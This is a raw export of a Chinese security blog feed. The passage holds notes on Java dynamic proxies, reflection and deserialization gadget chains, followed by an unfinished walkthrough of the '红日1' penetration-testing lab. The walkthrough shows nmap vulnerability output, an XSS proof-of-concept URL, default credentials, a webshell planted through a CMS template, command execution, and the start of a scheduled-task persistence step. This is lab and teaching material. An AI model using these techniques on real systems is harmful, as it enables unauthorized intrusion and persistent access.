class="title class_">UserService</span>&#123;  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;增加了一个用户&quot;</span>);  </span><br><span class="line"> &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">delete</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;删除了一个用户&quot;</span>);  </span><br><span class="line"> &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">update</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;更新了一个用户&quot;</span>);  </span><br><span class="line"> &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">query</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;查询了一个用户&quot;</span>);  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时我们实现动态代理让这个接口增加一些逻辑。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> src.JdkProxy.DynamicProxy;    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;    </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;    </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;    </span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">使用InvocationHandler 接口进行程序处理程序编写</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserProxyInvocationHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span> &#123;    </span><br><span class="line">    </span><br><span class="line">     <span class="comment">// 被代理的接口    </span></span><br><span class="line"> <span class="keyword">private</span> UserService userService;    </span><br><span class="line"> <span class="comment">// 创建一个实现的对象作为真实被代理对象。 </span></span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUserService</span><span class="params">(UserService userService)</span> &#123;    </span><br><span class="line">        <span class="built_in">this</span>.userService = userService;    </span><br><span class="line"> &#125;    </span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 动态生成代理类实例    </span></span><br><span class="line"> <span class="keyword">public</span> Object <span class="title function_">getProxy</span><span class="params">()</span>&#123;    </span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> Proxy.newProxyInstance(<span class="built_in">this</span>.getClass().getClassLoader(), userService.getClass().getInterfaces(), <span class="built_in">this</span>);    </span><br><span class="line">        <span class="comment">// 找到加载器 ,找出被代理接口实现的接口,同时写入程序处理</span></span><br><span class="line">        <span class="comment">// 也可以在在客户端部分写这部分代码</span></span><br><span class="line"> <span class="keyword">return</span> obj;    </span><br><span class="line"> &#125;    </span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 处理代理类实例，并返回结果    </span></span><br><span class="line"> <span class="meta">@Override</span>    </span><br><span class="line"> <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;    </span><br><span class="line"> <span class="comment">// 先执行 增加逻辑</span></span><br><span class="line">         log(method);    </span><br><span class="line">         <span class="comment">// 再执行被代理对象的逻辑 采用了java的反射执行 对应方法</span></span><br><span class="line"> <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> method.invoke(userService, args);    </span><br><span class="line"> <span class="keyword">return</span> obj;    </span><br><span class="line"> &#125;    </span><br><span class="line">    </span><br><span class="line">    <span class="comment">//业务自定义需求, 这就是增加的逻辑 </span></span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">log</span><span class="params">(Method method)</span>&#123;    </span><br><span class="line">        System.out.println(<span class="string">&quot;[Info] &quot;</span> + method.getName() + <span class="string">&quot;方法被调用&quot;</span>);    </span><br><span class="line"> &#125;    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>客户端</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> src.JdkProxy.DynamicProxy;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> src.JdkProxy.DynamicProxy.UserServiceImpl;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="comment">// 真实角色  </span></span><br><span class="line"> <span class="type">UserServiceImpl</span> <span class="variable">userServiceImpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UserServiceImpl</span>();  </span><br><span class="line"> <span class="comment">// 代理角色，不存在  </span></span><br><span class="line"> <span class="type">UserProxyInvocationHandler</span> <span class="variable">userProxyInvocationHandler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UserProxyInvocationHandler</span>();  </span><br><span class="line"> <span class="comment">// 如何体现 代理的是接口,无论是什么对象都统一强制转换成被代理的最开始接口 </span></span><br><span class="line"> userProxyInvocationHandler.setUserService((UserService) userServiceImpl); <span class="comment">// 设置要代理的对象  </span></span><br><span class="line">  </span><br><span class="line"> <span class="comment">// 动态生成代理类  </span></span><br><span class="line"> <span class="type">UserService</span> <span class="variable">proxy</span> <span class="operator">=</span> (UserService) userProxyInvocationHandler.getProxy();  </span><br><span class="line">  </span><br><span class="line"> proxy.add();  </span><br><span class="line"> proxy.delete();  </span><br><span class="line"> proxy.update();  </span><br><span class="line"> proxy.query();  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此其实 invoke 这个函数作用是阻止动态代理执行被代理类的方法，从而先执行增加的逻辑，然后再使用method方法的invoke 执行被代理类的方法。</p><h5 id="3-反序列化"><a href="#3-反序列化" class="headerlink" title="3. 反序列化"></a>3. 反序列化</h5><p>其实readobjec 也是再反序列化时候自动执行，其中也有包括反射在内的利用而动态代理的invoke</p><p>入口类 <code>A</code> 存在 <code>O.abc</code> 这个方法，也就是 A[O] -&gt; O.abc；而 O 呢，如果是一个动态代理类，在O进行一些方法调用时候首先会执行invoke 方法的增加逻辑，一旦<code>O</code> 的 <code>invoke</code> 方法里存在能调用有危险操作 <code>.f</code> 的方法的地方，那我们就可以进行利用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">readobjec 时候如果有能够传参入一个对象，URLDNS链子就是传递了URL 类,因此在readobject时候直接一直打到URL类的危险操作。</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">如果说我不传递类对象，我传递一个动态代理类。那么我进去肯定要执行方法，那我即使我不像URLDNS链子一样有危险操作,但是我可以自动触发invoke方法,invoke方法又跟readobjet方法一样可以自动触发一些操作，如果说我们能够传递一个有危险操作的类，那我就又可以执行了.</span></span><br><span class="line">A[O] -&gt; O.abc </span><br><span class="line"></span><br><span class="line">O[O2] invoke -&gt; O2.f // 此时将 B 去替换 O2  </span><br><span class="line">最后  ----&gt;  </span><br><span class="line">O[B] invoke -&gt; B.f // 达到漏洞利用效果</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java反射</title>
      <link href="/2025/02/05/java%E5%8F%8D%E5%B0%84/"/>
      <url>/2025/02/05/java%E5%8F%8D%E5%B0%84/</url>
      
        <content type="html"><![CDATA[<h5 id="1-基本概念"><a href="#1-基本概念" class="headerlink" title="1. 基本概念"></a>1. 基本概念</h5><p>反射机制是 Java 提供的一种强大功能，允许程序在运行时查询和操作类的信息</p><ul><li><p><strong>Class 类</strong>：每个 Java 类在运行时都有一个对应的 <code>Class</code> 对象，包含了该类的所有元数据（如字段、方法、构造函数等）。</p></li><li><p><strong>反射的用途</strong>：反射可以用于动态加载类、获取类的信息、调用方法、访问字段等。它通常用于框架、库或需要动态行为的应用程序中。</p></li></ul><ol><li>首先获得这个对象对应的Class类的实例</li><li>因为Class这个类存储着一个类的所有信息：属性、方法、构造函数….所以我们可以通过Class类的实例来获取你想要调用的那个方法</li><li>拿到了对应的方法过后，我们可以给这个方法传入对应的参数来调用它。</li></ol><h5 id="2-获取class"><a href="#2-获取class" class="headerlink" title="2. 获取class"></a>2. 获取class</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// 通过类字面量</span></span><br><span class="line">Class&lt;MyClass&gt; cls1 = MyClass.class;</span><br><span class="line"></span><br><span class="line">访问某个类的class属性，这个属性就存储着这个类对应的Class类的实例：</span><br><span class="line"><span class="type">Class</span> <span class="variable">clz</span> <span class="operator">=</span> com.axin.User.class;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过对象</span></span><br><span class="line"><span class="type">MyClass</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyClass</span>();</span><br><span class="line">Class&lt;?&gt; cls2 = obj.getClass();</span><br><span class="line"></span><br><span class="line">调用某个对象的getClass()方法：</span><br><span class="line"><span class="type">Class</span> <span class="variable">clz</span> <span class="operator">=</span> (<span class="keyword">new</span> <span class="title class_">User</span>()).getClass();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过 ClassLoader</span></span><br><span class="line">调用Class类的静态方法forName获取某个类的Class类实例：</span><br><span class="line">Class&lt;?&gt; cls3 = Class.forName(<span class="string">&quot;com.example.MyClass&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="3-获取类的信息"><a href="#3-获取类的信息" class="headerlink" title="3. 获取类的信息"></a>3. 获取类的信息</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Field[] fields = cls.getDeclaredFields();</span><br><span class="line"><span class="keyword">for</span> (Field field : fields) &#123;</span><br><span class="line">    System.out.println(field.getName());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="4-获取类的方法"><a href="#4-获取类的方法" class="headerlink" title="4. 获取类的方法"></a>4. 获取类的方法</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Method[] methods = cls.getDeclaredMethods();</span><br><span class="line"><span class="keyword">for</span> (Method method : methods) &#123;</span><br><span class="line">    System.out.println(method.getName());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// clz.getMethod(方法名，这个方法的参数类型)</span></span><br><span class="line"></span><br><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> clz.getMethod(<span class="string">&quot;setName&quot;</span>, String.class);</span><br></pre></td></tr></table></figure><h5 id="5-获取构造函数"><a href="#5-获取构造函数" class="headerlink" title="5. 获取构造函数"></a>5. 获取构造函数</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Constructor&lt;?&gt;[] constructors = cls.getDeclaredConstructors();</span><br><span class="line"><span class="keyword">for</span> (Constructor&lt;?&gt; constructor : constructors) &#123;</span><br><span class="line">    System.out.println(constructor.getName());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="6-操作字段"><a href="#6-操作字段" class="headerlink" title="6. 操作字段"></a>6. 操作字段</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// 这是还没有实例 是操作 类 </span></span><br><span class="line"><span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> cls.getDeclaredField(<span class="string">&quot;myField&quot;</span>);</span><br><span class="line">field.setAccessible(<span class="literal">true</span>); <span class="comment">// 如果字段是私有的，必须设置可访问性</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 因为必须要 设置属性了,因此需要创建实例</span></span><br><span class="line"></span><br><span class="line"><span class="type">MyClass</span> <span class="variable">myObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyClass</span>();</span><br><span class="line"><span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> field.get(myObject);</span><br><span class="line">field.set(myObject, newValue);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="7-操作方法"><a href="#7-操作方法" class="headerlink" title="7. 操作方法"></a>7. 操作方法</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getDeclaredMethod(<span class="string">&quot;myMethod&quot;</span>, String.class);</span><br><span class="line">method.setAccessible(<span class="literal">true</span>); <span class="comment">// 如果方法是私有的</span></span><br><span class="line"></span><br><span class="line"><span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">method.invoke(user, <span class="string">&quot;axin&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//这个已经在上面调用过了 Object result = method.invoke(myObject, &quot;argument&quot;);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 第一个参数是调用该方法的对象，第二个参数是一个可变长参</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>红日1</title>
      <link href="/2025/02/03/%E7%BA%A2%E6%97%A51/"/>
      <url>/2025/02/03/%E7%BA%A2%E6%97%A51/</url>
      
        <content type="html"><![CDATA[<h4 id="1-环境配置"><a href="#1-环境配置" class="headerlink" title="1. 环境配置"></a>1. 环境配置</h4><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20241012204654.png" alt="image.png"></p><blockquote><p>首先看到整个靶场的拓扑图，我们需要搭建一个虚拟的内网环境。</p></blockquote><ol><li>保证攻击机器能够连通web服务器，模拟公网环境。</li><li>保证攻击机器无法访问内部机器，但是确保web服务器可以和vm2和vm3连通。此时就需要三台机器在同一个网络中，进行一个内网的模拟。</li></ol><blockquote><p>根据搭建要求来看，我目前想要采用的策略是将kali和web服务器同时都做一个桥接的网卡，保障kali能够正常对于web服务器的访问。之后将vm2和vm3以及web服务器三台机器重新做一个仅主机网卡，保障三台机器是仅主机模式。但是尝试之后我采用了另外一种模式</p></blockquote><ul><li>创建vm3网卡设置为仅主机模式，同时将网段设置为192.168.52.0</li><li>创建vm4网卡设置为仅主机模式，同时将网段设置为192.168.53.0</li><li>kali设置为桥接网卡(我习惯使用桥接)同时加一个vm4网卡保证kali可以和win7服务器互通</li><li>win7设置为vm3 和vm4 网卡，vm3保障内网，vm4保障和kali互通</li><li>剩下机器只设置一个vm3网卡，模拟在内网环境中。</li></ul><h4 id="2-外围打点"><a href="#2-外围打点" class="headerlink" title="2. 外围打点"></a>2. 外围打点</h4><h5 id="2-1-资产端口"><a href="#2-1-资产端口" class="headerlink" title="2.1 资产端口"></a>2.1 资产端口</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">80/tcp   open  http    Apache httpd 2.4.23 ((Win32) OpenSSL/1.0.2j PHP/5.4.45)</span><br><span class="line">|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2j PHP/5.4.45</span><br><span class="line">|_http-dombased-xss: Couldn&#x27;t find any DOM based XSS.</span><br><span class="line">|_http-stored-xss: Couldn&#x27;t find any stored XSS vulnerabilities.</span><br><span class="line">| http-csrf: </span><br><span class="line">| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.53.128</span><br><span class="line">|   Found the following possible CSRF vulnerabilities: </span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.53.128:80/</span><br><span class="line">|     Form id: </span><br><span class="line">|     Form action: /l.php#bottom</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.53.128:80/l.php</span><br><span class="line">|     Form id: </span><br><span class="line">|_    Form action: /l.php#bottom</span><br><span class="line">| http-slowloris-check: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Slowloris DOS attack</span><br><span class="line">|     State: LIKELY VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-2007-6750</span><br><span class="line">|       Slowloris tries to keep many connections to the target web server open and hold</span><br><span class="line">|       them open as long as possible.  It accomplishes this by opening connections to</span><br><span class="line">|       the target web server and sending a partial request. By doing so, it starves</span><br><span class="line">|       the http server&#x27;s resources causing Denial Of Service.</span><br><span class="line">|       </span><br><span class="line">|     Disclosure date: 2009-09-17</span><br><span class="line">|     References:</span><br><span class="line">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750</span><br><span class="line">|_      http://ha.ckers.org/slowloris/</span><br><span class="line">| http-phpself-xss: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Unsafe use of $_SERVER[&quot;PHP_SELF&quot;] in PHP files</span><br><span class="line">|     State: VULNERABLE (Exploitable)</span><br><span class="line">|       PHP files are not handling safely the variable $_SERVER[&quot;PHP_SELF&quot;] causing Reflected Cross Site Scripting vulnerabilities.</span><br><span class="line">|              </span><br><span class="line">|     Extra information:</span><br><span class="line">|       </span><br><span class="line">|   Vulnerable files with proof of concept:</span><br><span class="line">|     http://192.168.53.128/l.php/%27%22/%3E%3Cscript%3Ealert(1)%3C/script%3E</span><br><span class="line">|   Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.53.128</span><br><span class="line">|     References:</span><br><span class="line">|       http://php.net/manual/en/reserved.variables.server.php</span><br><span class="line">|_      https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)</span><br><span class="line">| http-enum: </span><br><span class="line">|   /phpinfo.php: Possible information file</span><br><span class="line">|   /phpmyadmin/: phpMyAdmin</span><br><span class="line">|   /phpMyAdmin/: phpMyAdmin</span><br><span class="line">|_  /PHPMyAdmin/: phpMyAdmin</span><br><span class="line">| http-sql-injection: </span><br><span class="line">|   Possible sqli for queries:</span><br><span class="line">|     http://192.168.53.128:80/l.php?act=phpinfo%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.53.128:80/l.php?act=Function%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.53.128:80/l.php?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.53.128:80/l.php?=PHPE9568F35-D428-11d2-A769-00AA001ACF42%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.53.128:80/l.php?=PHPE9568F34-D428-11d2-A769-00AA001ACF42%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.53.128:80/l.php?act=phpinfo%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.53.128:80/l.php?act=Function%27%20OR%20sqlspider</span><br><span class="line">|   Possible sqli for forms:</span><br><span class="line">|     Form at path: /, form&#x27;s action: /l.php#bottom. Fields that might be vulnerable:</span><br><span class="line">|       host</span><br><span class="line">|       port</span><br><span class="line">|       login</span><br><span class="line">|       funName</span><br><span class="line">|     Form at path: /l.php, form&#x27;s action: /l.php#bottom. Fields that might be vulnerable:</span><br><span class="line">|       host</span><br><span class="line">|       port</span><br><span class="line">|       login</span><br><span class="line">|_      funName</span><br><span class="line">|_http-trace: TRACE is enabled</span><br><span class="line">|_http-vuln-cve2014-3704: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">3306/tcp open  mysql   MySQL (unauthorized)</span><br></pre></td></tr></table></figure><blockquote><p>因为我加了一个漏扫的模块进去，可以看到外围的这台服务器还是很脆弱的，csrf，xss，sql注入以及一些系统。但是我们始终牢记的是我们需要打点，如果说连这个内网的入口都没有，何谈内网渗透的呢!</p></blockquote><h5 id="2-2-资产梳理"><a href="#2-2-资产梳理" class="headerlink" title="2.2 资产梳理"></a>2.2 资产梳理</h5><p>Apache&#x2F;2.4.23 (Win32) OpenSSL&#x2F;1.0.2j PHP&#x2F;5.4.45<br>服务器: localhost via TCP&#x2F;IP<br>软件: MySQL<br>软件版本: 5.5.53 - MySQL Community Server (GPL)<br>协议版本: 10<br>用户: root@localhost</p><ul><li>数据库客户端版本: libmysql - mysqlnd 5.0.10 - 20111026 - $Id: c85105d7c6f7d70d609bb4c000257868a40840ab $</li><li>PHP 扩展: mysqli</li><li>版本信息: phpStudy 2014</li></ul><p>Windows NT STU1 6.1 build 7601 (Windows 7 Business Edition Service Pack 1) i586</p><p>YxcmsApp 1.2.1</p><h5 id="2-3-web-漏洞"><a href="#2-3-web-漏洞" class="headerlink" title="2.3 web 漏洞"></a>2.3 web 漏洞</h5><h6 id="2-3-1-xss"><a href="#2-3-1-xss" class="headerlink" title="2.3.1 xss"></a>2.3.1 xss</h6><p>  这个xss漏洞使用nmap的扫描模块扫出来的，主要是因为php_slef的这个功能点,这个xss点是肉眼看不出来的。因为他是用后端代码带出来的漏洞，最主要是因为[[PHP_SELF]]<br>  <code>$_SERVER[&quot;PHP_SELF&quot;]</code>  是因为这个函数会返回请求url的请求文件。因此如果我们能在文件路径上做文章我们就可以直接构造语句</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.53.128/l.php/&#x27;/%3E%3Cscript%3Ealert(1)%3C/script%3E </span><br></pre></td></tr></table></figure><h6 id="2-3-2-phpinfo"><a href="#2-3-2-phpinfo" class="headerlink" title="2.3.2 phpinfo"></a>2.3.2 phpinfo</h6><p>phpinfo的很多内容也是很好识别的</p><h6 id="2-3-3-phpmyadmin"><a href="#2-3-3-phpmyadmin" class="headerlink" title="2.3.3 phpmyadmin"></a>2.3.3 phpmyadmin</h6><p>一眼定睛数据库管理工具<br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20241020203329.png" alt="image.png"></p><p>可以看到phpmyadmin， 又是一个验证框，直接试试默认口令root&#x2F;root，成功登录.<br>发现了一个旁站</p><h6 id="2-3-4-YXCMS"><a href="#2-3-4-YXCMS" class="headerlink" title="2.3.4 YXCMS"></a>2.3.4 YXCMS</h6><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20241020204957.png" alt="image.png"><br>md5解密   admin&#x2F;949ba59abbe56e05   但是前台登录不上. 之后找到yxcms的一个getshell方式.找到了一个默认口令 admin&#x2F;123456 直接进入后台. 作为一个红队选手,快速打点,扩大影响才是我们需要的.</p><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20241103194247.png" alt="image.png"></p><h6 id="2-3-5-相关口令"><a href="#2-3-5-相关口令" class="headerlink" title="2.3.5 相关口令"></a>2.3.5 相关口令</h6><p>通过对于phpmyadmin的相关加密数据得到<br>root&#x2F;root<br>admin&#x2F;123456<br>admin&#x2F;949ba59abbe56e05</p><h5 id="2-4-GETshell"><a href="#2-4-GETshell" class="headerlink" title="2.4 GETshell"></a>2.4 GETshell</h5><p>根据yxcms的nday,成功修改模板文件,将我们的一句话木马成功写入。<br>访问对应的模板文件<a href="http://192.168.53.128/yxcms/index.php?cmd=phpinfo()">http://192.168.53.128/yxcms/index.php?cmd=phpinfo()</a>;  发现我们可以执行对应的命令。</p><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20241020213905.png" alt="image.png"></p><h4 id="3-内网渗透"><a href="#3-内网渗透" class="headerlink" title="3. 内网渗透"></a>3. 内网渗透</h4><h5 id="3-1-上线cs"><a href="#3-1-上线cs" class="headerlink" title="3.1 上线cs"></a>3.1 上线cs</h5><p>由于我们已经上线蚁剑，直接让我们的马子上线。·</p><p>开启监听，上线马儿<br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20241103211316.png" alt="image.png"></p><h5 id="3-2-权限维持"><a href="#3-2-权限维持" class="headerlink" title="3.2 权限维持"></a>3.2 权限维持</h5><p>[[权限维持]]</p><h6 id="3-2-1-进程注入"><a href="#3-2-1-进程注入" class="headerlink" title="3.2.1 进程注入"></a>3.2.1 进程注入</h6><p>这一部分不做赘述</p><h6 id="3-2-2-计划任务"><a href="#3-2-2-计划任务" class="headerlink" title="3.2.2 计划任务"></a>3.2.2 计划任务</h6><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 首先把我们的exe可执行文件放在 计划任务之中 </span></span><br><span class="line">schtasks /create /tn win /<span class="built_in">sc</span> onlogon   /tr <span 